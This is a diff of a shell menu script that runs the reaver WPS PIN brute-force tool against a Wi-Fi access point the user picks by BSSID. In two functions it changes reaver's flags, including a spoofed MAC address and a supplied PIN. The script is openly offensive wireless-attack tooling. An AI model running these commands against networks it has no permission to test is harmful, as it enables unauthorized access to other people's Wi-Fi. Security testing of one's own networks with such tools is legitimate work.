@@ -61,7 +61,7 @@ two() {
 	echo "Please enter BSSID from above : "
 	read BSSID
 	monitor
-	reaver -i wlan1 -a -f -c 1 -b $BSSID -r 3:30 -E -S -vv -N -T 1 -t 20 -d 0 -l 420 --mac=9e:49:1f:d6:37:f4
+	reaver -i wlan1 -b $BSSID -E -S -vv -N -T 1 -t 20 -d 0 -l 420 -m 9e:49:1f:d6:37:f4
 	ifconfig wlan1 down # Switch off
 	pause
 }
@@ -76,7 +76,7 @@ three() {
 	read BSSID
 	echo "Please enter the PIN : "
 	read PIN
-	reaver -i wlan1 -a -f -c 1 -e $BSSID -r 3:30 -E -s -vv -N -T 1 -t 20 -d 0 -l 420 --mac=9e:49:1f:d6:37:f4 --pin=$PIN
+	reaver -i wlan1 -b $BSSID -E -S -vv -N -T 1 -t 20 -d 0 -l 420 -p $PIN -m 9e:49:1f:d6:37:f4
 	ifconfig wlan1 down # Switch off
 	pause
 }
